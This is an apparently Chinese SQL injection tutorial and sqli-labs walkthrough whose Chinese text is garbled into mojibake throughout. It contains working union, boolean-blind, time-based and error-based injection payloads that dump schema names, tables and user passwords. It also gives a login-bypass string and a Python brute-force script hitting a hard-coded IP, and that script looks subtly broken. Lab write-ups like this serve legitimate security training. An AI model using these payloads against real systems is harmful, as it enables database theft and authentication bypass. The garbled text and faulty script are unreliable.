†æ•°æ®æ·¹æ²¡ï¼Œä¸çŸ¥æ‰€æªã€‚ è¿™æ—¶å€™å¯ä»¥æ·»åŠ é™åˆ¶ï¼ŒæŒ‡å®šæˆ‘è¦å“ªä¸€åˆ—çš„æ•°æ® SELECT åˆ—å FROM è¡¨å æ•°æ®è¿˜æ˜¯å¾ˆå¤šï¼Œå¯ä»¥æ·»åŠ WHEREæ¥è¿›è¡Œè¿›ä¸€æ­¥é™åˆ¶ SELECT åˆ—å FROM è¡¨å WHERE æ¡ä»¶ å¦‚æœéœ€è¦å°†æ•°æ®æ’åºçš„è¯ï¼Œå¯ä»¥ç”¨ORDER BY SELECT åˆ—å FROM è¡¨å WHERE æ¡ä»¶ ORDER BY åˆ—å æœ‰æ—¶å€™ï¼Œå’±åªæƒ³è¿”å›å‰å‡ æ¡æ•°æ®ï¼Œå°±å¯ä»¥åŠ å…¥LIMIT SELECT åˆ—å FROM è¡¨å WHERE æ¡ä»¶ ORDER BY åˆ—å LIMIT æ•°å­— SQLæ“ä½œç¬¦WHERE åˆ—å LIKE é€šé…ç¬¦ æŒ‰ç…§é€šé…ç¬¦åŒ¹é… é€šé…ç¬¦ æè¿° % æ›¿ä»£0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ _ æ›¿ä»£1ä¸ªå­—ç¬¦ [charlist] å­—ç¬¦åˆ—ä¸­çš„ä»»ä½•å•ä¸€å­—ç¬¦ [^charlist] æˆ– [!charlist] ä¸åœ¨å­—ç¬¦åˆ—ä¸­çš„ä»»ä½•å•ä¸€å­—ç¬¦ WHERE åˆ—å IN (â€˜å€¼1â€™,â€™å€¼2â€™) WHERE åˆ—å BETWEEN å€¼1 AND å€¼2; è”åˆæŸ¥è¯¢SELECT åˆ—å1,åˆ—å2â€¦ FROM table1 UNION SELECT åˆ—å1,åˆ—å2â€¦ FROM table2; æ³¨æ„:è”åˆæŸ¥è¯¢è¦æ±‚å‰åå­—æ®µæ•°ç›¸åŒï¼Œå¦åˆ™å°†ä¼šæŠ¥é”™. ç‰¹æ®Šçš„æ•°æ®åº“information_schemaæ‘˜è‡ªè¿™é‡Œ åœ¨æ•°æ®åº“é‡Œï¼Œæœ‰è¿™æ ·ä¸€ä¸ªæ•°æ®åº“information_schemaï¼Œæ•°æ®åº“æ˜¯MySQLè‡ªå¸¦çš„ï¼Œå®ƒæä¾›äº†è®¿é—®æ•°æ®åº“å…ƒæ•°æ®çš„æ–¹å¼ã€‚ä»€ä¹ˆæ˜¯å…ƒæ•°æ®å‘¢ï¼Ÿå…ƒæ•°æ®æ˜¯å…³äºæ•°æ®çš„æ•°æ®ï¼Œå¦‚æ•°æ®åº“åæˆ–è¡¨åï¼Œåˆ—çš„æ•°æ®ç±»å‹ï¼Œæˆ–è®¿é—®æƒé™ç­‰ã€‚æœ‰äº›æ—¶å€™ç”¨äºè¡¨è¿°è¯¥ä¿¡æ¯çš„å…¶ä»–æœ¯è¯­åŒ…æ‹¬â€œæ•°æ®è¯å…¸â€å’Œâ€œç³»ç»Ÿç›®å½•â€ã€‚ è¡¨å åŠŸèƒ½ SCHEMATA æä¾›äº†å½“å‰mysqlå®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯ã€‚æ˜¯show databasesçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚ TABLES æä¾›äº†å…³äºæ•°æ®åº“ä¸­çš„è¡¨çš„ä¿¡æ¯ï¼ˆåŒ…æ‹¬è§†å›¾ï¼‰ã€‚è¯¦ç»†è¡¨è¿°äº†æŸä¸ªè¡¨å±äºå“ªä¸ªschemaï¼Œè¡¨ç±»å‹ï¼Œè¡¨å¼•æ“ï¼Œåˆ›å»ºæ—¶é—´ç­‰ä¿¡æ¯ã€‚æ˜¯show tables from schemanameçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚ COLUMNS ä¾›äº†è¡¨ä¸­çš„åˆ—ä¿¡æ¯ã€‚è¯¦ç»†è¡¨è¿°äº†æŸå¼ è¡¨çš„æ‰€æœ‰åˆ—ä»¥åŠæ¯ä¸ªåˆ—çš„ä¿¡æ¯ã€‚æ˜¯show columns from schemaname.tablenameçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚ STATISTICS æä¾›äº†å…³äºè¡¨ç´¢å¼•çš„ä¿¡æ¯ã€‚æ˜¯show index from schemaname.tablenameçš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚ USER_PRIVILEGES ç»™å‡ºäº†å…³äºå…¨ç¨‹æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æºè‡ªmysql.useræˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚ SCHEMA_PRIVILEGES ç»™å‡ºäº†å…³äºæ–¹æ¡ˆï¼ˆæ•°æ®åº“ï¼‰æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æ¥è‡ªmysql.dbæˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚ TABLE_PRIVILEGESï¼ˆè¡¨æƒé™ï¼‰ ç»™å‡ºäº†å…³äºè¡¨æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æºè‡ªmysql.tables_privæˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚ COLUMN_PRIVILEGESï¼ˆåˆ—æƒé™ï¼‰ ç»™å‡ºäº†å…³äºåˆ—æƒé™çš„ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯æºè‡ªmysql.columns_privæˆæƒè¡¨ã€‚æ˜¯éæ ‡å‡†è¡¨ã€‚ CHARACTER_SETSï¼ˆå­—ç¬¦é›†ï¼‰ æä¾›äº†mysqlå®ä¾‹å¯ç”¨å­—ç¬¦é›†çš„ä¿¡æ¯ã€‚æ˜¯SHOW CHARACTER SETç»“æœé›†å–ä¹‹æ­¤è¡¨ã€‚ â€¦ â€¦ åœ¨æ³¨å…¥çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¸¸ç”¨çš„æ˜¯information_schema.tablesä¸‹é¢çš„table_nameä»¥åŠtable_schemaè¡¨ååŠå…¶æ‰€åœ¨çš„æ•°æ®åº“åå­—ã€‚ä½¿ç”¨information_schema.columnsä¸‹çš„column_nameè·å–åˆ—å select çš„å…¶ä»–ç”¨æ³•12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667mysql&gt; select 1;+---+| 1 |+---+| 1 |+---+1 row in set (0.00 sec)mysql&gt; select 1,2,3;+---+---+---+| 1 | 2 | 3 |+---+---+---+| 1 | 2 | 3 |+---+---+---+1 row in set (0.00 sec)mysql&gt; select (1&gt;2);+-------+| (1&gt;2) |+-------+| 0 |+-------+1 row in set (0.00 sec)mysql&gt; select (1&lt;2);+-------+| (1&lt;2) |+-------+| 1 |+-------+1 row in set (0.00 sec)mysql&gt; select &quot;aaaa&quot;;+------+| aaaa |+------+| aaaa |+------+1 row in set (0.00 sec)mysql&gt; select (1&lt;2) from users;+-------+| (1&lt;2) |+-------+| 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 || 1 |+-------+13 rows in set (0.00 sec)mysql&gt; select (version());+-------------------------+| (version()) |+-------------------------+| 5.5.44-0ubuntu0.14.04.1 |+-------------------------+1 row in set (0.00 sec) SQL æ³¨å…¥å¸¸ç”¨å‡½æ•°å­—ç¬¦æ‹¼æ¥1. concat()å‡½æ•° åŠŸèƒ½ï¼šå°†å¤šä¸ªå­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ è¯­æ³•ï¼šconcat(str1, str2,â€¦) è¯´æ˜ï¼šè¿”å›ç»“æœä¸ºè¿æ¥å‚æ•°äº§ç”Ÿçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œåˆ™è¿”å›å€¼ä¸ºnullã€‚ 123456789101112131415161718mysql&gt; select concat('a','b','c') -&gt; ;+---------------------+| concat('a','b','c') |+---------------------+| abc |+---------------------+1 row in set (0.00 sec)mysql&gt; select concat('a','b','c','null') -&gt; ;+----------------------------+| concat('a','b','c','null') |+----------------------------+| abcnull |+----------------------------+1 row in set (0.00 sec) 2. concat_ws()å‡½æ•° åŠŸèƒ½ å’Œconcat()ä¸€æ ·ï¼Œä½†æ˜¯å¯ä»¥æŒ‡å®šåˆ†éš”ç¬¦ è¯­æ³•ï¼šconcat_ws(separator, str1, str2, â€¦) ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šåˆ†éš”ç¬¦ã€‚éœ€è¦æ³¨æ„çš„æ˜¯åˆ†éš”ç¬¦ä¸èƒ½ä¸ºnullï¼Œå¦‚æœä¸ºnullï¼Œåˆ™è¿”å›ç»“æœä¸ºnullã€‚ 12345678mysql&gt; select concat_ws('#','a','b','c','null') -&gt; ;+-----------------------------------+| concat_ws('#','a','b','c','null') |+-----------------------------------+| a#b#c#null |+-----------------------------------+1 row in set (0.00 sec) 3.group_concat()å‡½æ•° åŠŸèƒ½ï¼šå°†group byäº§ç”Ÿçš„åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœã€‚ è¯­æ³•ï¼šgroup_concat( [distinct] è¦è¿æ¥çš„å­—æ®µ [order by æ’åºå­—æ®µ asc/desc ] [separator] ) 12345678mysql&gt; select 1,(select group_concat(username) from users); +---+---------------------------------------------------------------------------------------------+| 1 | (select group_concat(username) from users) |+---+---------------------------------------------------------------------------------------------+| 1 | Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 |+---+---------------------------------------------------------------------------------------------+1 row in set (0.00 sec) ç›²æ³¨å¸¸ç”¨1.ascii()å‡½æ•°éƒ½ä¼šç”¨ï¼Œä¸è¯´äº† 2.substr()å‡½æ•° substr(str,pos,len);//str:å­—ç¬¦ä¸²ï¼Œposï¼šèµ·å§‹ä½ç½®ï¼Œlenï¼šæˆªæ–­é•¿åº¦ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647mysql&gt; select substr(&quot;abcdefg&quot;,1,1);+-----------------------+| substr(&quot;abcdefg&quot;,1,1) |+-----------------------+| a |+-----------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,1,3);+-----------------------+| substr(&quot;abcdefg&quot;,1,3) |+-----------------------+| abc |+-----------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,2,3);+-----------------------+| substr(&quot;abcdefg&quot;,2,3) |+-----------------------+| bcd |+-----------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,-2,3);+------------------------+| substr(&quot;abcdefg&quot;,-2,3) |+------------------------+| fg |+------------------------+1 row in set (0.01 sec)mysql&gt; select substr(&quot;abcdefg&quot;,-2,1);+------------------------+| substr(&quot;abcdefg&quot;,-2,1) |+------------------------+| f |+------------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,-3,2);+------------------------+| substr(&quot;abcdefg&quot;,-3,2) |+------------------------+| ef |+------------------------+1 row in set (0.00 sec) sleep()éƒ½ä¼šï¼Œä¸è¯´äº† æŠ¥é”™æ³¨å…¥å¸¸ç”¨updatexml()extractvalue()group byæŠ¥é”™æ³¨å…¥0x02 SQLæ³¨å…¥é¶åœºâ€“Sqli-labsLess-1 | æ˜¾é”™æ³¨å…¥åˆ¤æ–­æ³¨å…¥ç‚¹ä¸ºå­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹: ?id=1 id=2 id=1+1 è¿™é‡Œå¯ä»¥å‘ç°ï¼Œæ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„1+1è¿›è¡Œè¿ç®—,å¯ä»¥ç¡®å®šæ˜¯å­—ç¬¦å‹æ³¨å…¥ã€‚æŸ¥çœ‹æºä»£ç  1$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;; è¿™é‡Œæœ‰ä¸ªä»¤äººå¼‚æˆ–çš„åœ°æ–¹:?id=1+1ä¸ºå•¥è¿”å›äº†?id=1çš„ç»“æœï¼Œè¿™é‡Œè¿›mysqlæ§åˆ¶å°é‡Œé¢åº·åº·ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061mysql&gt; select * from users where id='1+1';+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set, 1 warning (0.00 sec)mysql&gt; select * from users where id=1;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=&quot;1&quot;;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=&quot;1a&quot;;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set, 1 warning (0.00 sec)mysql&gt; select * from users where id=&quot;a1&quot;;Empty set (0.00 sec)mysql&gt; select * from users where id=&quot;0x1&quot;;Empty set (0.00 sec)mysql&gt; select * from users where id=0x1;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=+0b01;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=+ 0b01;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec) è¿™å®›å¦‚PHPä¸€æ ·å¼ºå¤§çš„é²æ£’æ€§ï¼Œæˆ‘å·²ç»æœ‰ä¸å¥½çš„é¢„æ„Ÿäº†ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼Œæ–¹ä¾¿ç¨‹åºå‘˜å†™ä»£ç  = æ–¹ä¾¿é»‘å®¢è¿›æ¥æäº‹æƒ…ã€‚ æ›´æ·±å…¥çš„æµ‹è¯•è”åˆæ³¨å…¥: ?id=1â€™ union select 1,2,3 â€“+ å®é™…æ‰§è¡Œçš„æ˜¯ï¼Œè¿™é‡Œ--+æ˜¯å°†åé¢çš„å†…å®¹æ³¨é‡Šæ‰äº† SELECT * FROM users WHERE id=â€™1â€™ union select 1,2,3 â€“+ LIMIT 0,1 å¥½åƒå•¥éƒ½æ²¡å˜ï¼Œä¸è¿‡åœ¨åç«¯çš„ä»£ç é‡Œå¯ä»¥çœ‹è§ç›¸å…³çš„é€»è¾‘ 12345678if($row) { echo &quot;&lt;font size='5' color= '#99FF00'&gt;&quot;; echo 'Your Login name:'. $row['username']; echo &quot;&lt;br&gt;&quot;; echo 'Your Password:' .$row['password']; echo &quot;&lt;/font&gt;&quot;; } MySQLè¿”å›çš„æ˜¯ 1234567+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb || 1 | 2 | 3 |+----+----------+----------+2 rows in set (0.00 sec) ä½†å› ä¸ºåç«¯ä»£ç çš„è®¾è®¡ï¼Œåªèƒ½æ˜¾ç¤ºç¬¬ä¸€æ¡ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥è®©å‰é¢idæŒ‡å‘ä¸€ä¸ªä¸å­˜åœ¨çš„æ•°æ®,è¿™æ ·ç¬¬ä¸€æ¡æ•°æ®å°±åªä¼šè¿”å›ç©º 1234567mysql&gt; SELECT * FROM users WHERE id='-1' union select 1,2,3; +----+----------+----------+| id | username | password |+----+----------+----------+| 1 | 2 | 3 |+----+----------+----------+1 row in set (0.00 sec) å¼€å§‹çˆ†é‡‘å¸æ•°æ®äº† ?id=-1â€™ union select 1,(select username from users limit 4,1),3 â€“+ å› ä¸ºselect username from usersä¼šè¿”å›å¤šæ¡æ•°æ®ï¼Œè¿™æ—¶å€™ä½¿ç”¨limitæ¥é™åˆ¶è¿”å›å“ªä¸€è¡Œ è¿™æ ·å­çˆ†ç ´æ•°æ®ä¸å¤Ÿçˆ½ï¼Œè¿˜å¾—æ‰‹åŠ¨ä¸€ä¸ªä¸€ä¸ªæ“ï¼Œå¤ªéº»çƒ¦äº†,ç›´æ¥ä¸Šgroup_concat() ?id=-1â€™ union select 1,(select group_concat(username) from users),3 â€“+ ä¸è¿‡è¿™æ˜¯å’±åœ¨ç¿»çœ‹äº†æºä»£ç ï¼Œå¹¶ä¸”çŸ¥é“è¿™äº›æ•°æ®çš„æƒ…å†µä¸‹åšå‡ºæ¥çš„ï¼Œåœ¨çœŸæ­£æ³¨å…¥çš„ç¯å¢ƒä¸‹ï¼Œå¾—éœ€è¦è·å–è¿™äº›æ•°æ®ï¼Œè¿™æ—¶å€™å°±éœ€è¦information_schemaè¿™ä¸ªæ•°æ®åº“äº† ?id=-1â€™ union select 1,(select group_concat(schema_name) from schemata),3 â€“+ å‘ç”Ÿä»€ä¹ˆäº‹äº†ï¼Ÿå¥½åƒæœ‰ç‚¹ä¸å¤ªå¯¹åŠ²å‘¢ã€‚å› ä¸ºè¿™é¢˜æ‰€åœ¨çš„æ•°æ®åº“æ˜¯securityï¼Œè€Œschemataæ˜¯åœ¨information_schemaè¿™ä¸ªæ•°æ®åº“ä¸‹é¢çš„ã€‚æˆ‘ä»¬éœ€è¦æ¢æˆinformation_schema.schemata ?id=-1â€™ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 â€“+ æ•°æ®åº“çˆ†å‡ºæ¥äº†ï¼Œçˆ†è¡¨å ?id=-1â€™ union select 1,(select group_concat(table_name) from information_schema.columns where table_schema=â€securityâ€),3 â€“+ è¡¨åå‡ºæ¥äº†ï¼Œçˆ†å­—æ®µ ?id=-1â€™ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=â€usersâ€),3 â€“+ éœ€è¦çš„æ•°æ®éƒ½æœ‰äº†ï¼Œå’±å¯ä»¥ç›´æ¥æŠŠåº“ç»™è„±ä¸‹æ¥äº† Less-2 - Less-4è¿™å‡ é¢˜éƒ½ä¸€æ ·ï¼Œæ— éæ˜¯æ³¨å…¥ç‚¹å‘¨å›´åŒ…è£¹çš„ä¸œè¥¿ä¸ä¸€æ ·ï¼Œä¸å¤šèµ˜è¿°ï¼Œè¿‡ã€‚ Less-5 | å¸ƒå°”ç›²æ³¨ ?id=1 çœ‰æ¸…ç›®ç§€ï¼Œå•¥éƒ½æœ¨æœ‰ã€‚ ?id=1â€â€˜ä¸€é€šæµ‹è¯•ä¸‹æ¥ï¼Œå‘ç°æœ‰äº†æŠ¥é”™ä¿¡æ¯ å¦‚ä½•åˆ©ç”¨æŠ¥é”™ä¿¡æ¯æ³¨å…¥å‘¢ï¼Ÿ ?id=1â€™ and 1 = 1 â€“+i ?id=2â€™ and 2 = 1 â€“+ é‚£æœ‰æ„æ€çš„å°±æ¥äº†ï¼Œå˜»å˜» 12345678mysql&gt; select ((substr(group_concat((select group_concat(schema_name) from information_schema.schemata)),1,1))=0);+-----------------------------------------------------------------------------------------------------+| ((substr(group_concat((select group_concat(schema_name) from information_schema.schemata)),1,1))=0) |+-----------------------------------------------------------------------------------------------------+| 1 |+-----------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) çˆ†æ•°æ®åº“ 1234567891011121314import requestsurl = &quot;http://39.104.82.167/Less-5/?id=&quot;res = &quot;&quot;for i in range(0,256): for j in range(0,256): for k in range(0,256): payload = f&quot;1' and ascii(substr((select group_concat(schema_name) from information_schema.schemata),{j},1)) = {k} --+&quot; r = requests.get(url+payload) if &quot;You are in...........&quot; in r.text: res += chr(k) print(res) break æ›´æ”¹payloadæ¥çˆ†è¡¨ 1payload = f&quot;1' and ascii(substr((select group_concat(table_name) from information_schema.columns where table_schema=\\&quot;security\\&quot;),{j},1)) = {k} --+&quot; æ›´æ”¹payload æ¥çˆ†å­—æ®µ 1payload = f&quot;1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),{j},1)) = {k} --+&quot; Tips æ— ANDçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç”¨^ Less 6-8 éƒ½å·®ä¸å¤šï¼Œå°±æ˜¯éœ€è¦å„ç§å¥‡å¦™çš„é—­åˆç•¥ Less 9è¿™é‡Œéœ€è¦æ—¶é—´ç›²æ³¨ï¼Œå’Œå¸ƒå°”ç›²æ³¨å·®ä¸å¤šåªæ˜¯éœ€è¦æ·»åŠ ä¸€ä¸ªif(a,sleep(10),1)åˆ¤æ–­ ?id=1â€™ and if(1=1,sleep(5),1)â€“+ åˆ¤æ–­å‚æ•°æ„é€ ã€‚ ?id=1â€™and if(length((select database()))&gt;9,sleep(5),1)â€“+ åˆ¤æ–­æ•°æ®åº“åé•¿åº¦ ?id=1â€™and if(ascii(substr((select database()),1,1))=115,sleep(5),1)â€“+ é€ä¸€åˆ¤æ–­æ•°æ®åº“å­—ç¬¦ ?id=1â€™and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)â€“+ åˆ¤æ–­æ‰€æœ‰è¡¨åé•¿åº¦ ?id=1â€™and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)â€“+ é€ä¸€åˆ¤æ–­è¡¨å ?id=1â€™and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=â€™usersâ€™))&gt;20,sleep(5),1)â€“+ åˆ¤æ–­æ‰€æœ‰å­—æ®µåçš„é•¿åº¦ ?id=1â€™and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=â€™usersâ€™),1,1))&gt;99,sleep(5),1)â€“+ é€ä¸€åˆ¤æ–­å­—æ®µåã€‚ ?id=1â€™ and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)â€“+ åˆ¤æ–­å­—æ®µå†…å®¹é•¿åº¦ ?id=1â€™ and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)â€“+ é€ä¸€æ£€æµ‹å†…å®¹ã€‚ Less 10 ä¸€æ¨¡ä¸€æ ·ï¼Œç•¥Less 11 | ä¸‡èƒ½å¯†ç è¿™æ¬¡å¼€å§‹ï¼Œä¸æ˜¯getä¼ å‚äº†ï¼Œæ¢æˆPOSTä¼ å‚è¿˜ç»™äº†ä¸ªç™»å½•æ¡†ï¼Œå…ˆéšä¾¿ç©¿ä¸ªæ•°æ®åº·åº· è¿™æ—¶å€™æ‹¿å‡ºæˆ‘ä»¬çš„ç©¶ææ— æ•Œç‚«é…·ä¸‡èƒ½å¯†ç 1' or 1=1# å¥½äº†ï¼Œè¿™å°±è¿›å»äº† ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå’±æŠŠæºç ç¿»å¼€ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variablesif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])){ $uname=$_POST['uname']; $passwd=$_POST['passwd']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname); fwrite($fp,'Password:'.$passwd.&quot;\\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;; $result=mysql_query($sql); //æ³¨æ„è¿™é‡Œ $row = mysql_fetch_array($result); if($row) { //echo '&lt;font color= &quot;#0000ff&quot;&gt;'; echo &quot;&lt;br&gt;&quot;; echo '&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;'; //echo &quot; You Have successfully logged in\\n\\n &quot; ; echo '&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;'; echo &quot;&lt;br&gt;&quot;; echo 'Your Login name:'. $row['username']; echo &quot;&lt;br&gt;&quot;; echo 'Your Password:' .$row['password']; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo '&lt;img src=&quot;../images/flag.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; } else { echo '&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;'; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo '&lt;img src=&quot;../images/slap.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; }}?&gt; å…³é”®ç‚¹åœ¨è¿™é‡Œ$result=mysql_query($sql); è¿™é‡Œçš„ç»“æœæ˜¯ç”¨sqlè¯­å¥çš„æŸ¥è¯¢ç»“æœæ¥ï¼Œæ‰€ä»¥åªéœ€è¦è®©è¯­å¥è¿”å›ä¸€ä¸ªçœŸå°±è¡Œäº†ï¼Œor 1 = 1ä½¿å¾—æ•´ä¸ªè¯­å¥æ’çœŸï¼Œè¿™å°±è®©æˆ‘ä»¬æˆåŠŸç™»é™†è¿›å»äº† ä¹‹åæˆ‘ä»¬å°±å¯ä»¥æ³¨å…¥è·å–ä¿¡æ¯äº†ã€‚ Less 12 -16 éƒ½å·®ä¸å¤šç•¥ Less 17 | æŠ¥é”™æ³¨å…¥è¿™é¢˜å¼€å§‹ä¸åŒäº†ï¼Œä½¿ç”¨çš„æ˜¯updateè€Œä¸æ˜¯select 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394function check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,15); } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) { $value = &quot;'&quot; . mysql_real_escape_string($value) . &quot;'&quot;; } else { $value = intval($value); } return $value; }// take the variablesif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])){//making sure uname is not injectable$uname=check_input($_POST['uname']); $passwd=$_POST['passwd'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'User Name:'.$uname.&quot;\\n&quot;);fwrite($fp,'New Password:'.$passwd.&quot;\\n&quot;);fclose($fp);// connectivity @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);//echo $row; if($row) { //echo '&lt;font color= &quot;#0000ff&quot;&gt;'; $row1 = $row['username']; //echo 'Your Login name:'. $row1; $update=&quot;UPDATE users SET password = '$passwd' WHERE username='$row1'&quot;; mysql_query($update); echo &quot;&lt;br&gt;&quot;; if (mysql_error()) { echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;'; print_r(mysql_error()); echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;'; //echo &quot; You password has been successfully updated &quot; ; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } echo '&lt;img src=&quot;../images/flag1.jpg&quot; /&gt;'; //echo 'Your Password:' .$row['password']; echo &quot;&lt;/font&gt;&quot;; } else { echo '&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;'; //echo &quot;Bug off you Silly Dumb hacker&quot;; echo &quot;&lt;/br&gt;&quot;; echo '&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; }} æŠ¥é”™æ³¨å…¥å¼€æ·¦ èƒ½è¿›è¡ŒæŠ¥é”™çš„å‡½æ•°extractvalue() æ¼”ç¤º: 12345mysql&gt; select extractvalue(1,concat(0x5c,&quot;114514&quot;,0x5c));ERROR 1105 (HY000): XPATH syntax error: '\\114514\\'``` * payload: 1â€™ and (extractvalue(1,concat(0x5c,version(),0x5c)))# çˆ†ç‰ˆæœ¬ 1â€™ and (extractvalue(1,concat(0x5c,database(),0x5c)))# çˆ†æ•°æ®åº“ 1â€™ and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)))# çˆ†è¡¨å 1â€™ and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=â€™usersâ€™),0x5c)))# çˆ†å­—æ®µå 1â€™ and (extractvalue(1,concat(0x5c,(select password from (select password from users where username=â€™admin1â€™) b) ,0x5c)))# çˆ†å­—æ®µå†…å®¹è¯¥æ ¼å¼é’ˆå¯¹mysqlæ•°æ®åº“ã€‚ 1â€™ and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))# çˆ†å­—æ®µå†…å®¹ã€‚ 1234567#### updatexml()* `updatexml()`æ˜¯ä¸€ä¸ªä½¿ç”¨ä¸åŒçš„xmlæ ‡è®°åŒ¹é…å’Œæ›¿æ¢xmlå—çš„å‡½æ•°ã€‚* è¯­æ³•ï¼š updatexmlï¼ˆXML_documentï¼ŒXPath_stringï¼Œnew_valueï¼‰ ç¬¬ä¸€ä¸ªå‚æ•°ï¼šæ˜¯stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc ç¬¬äºŒä¸ªå‚æ•°ï¼šä»£è¡¨è·¯å¾„ï¼ŒXpathæ ¼å¼çš„å­—ç¬¦ä¸²ä¾‹å¦‚//titleã€@langã€‘ 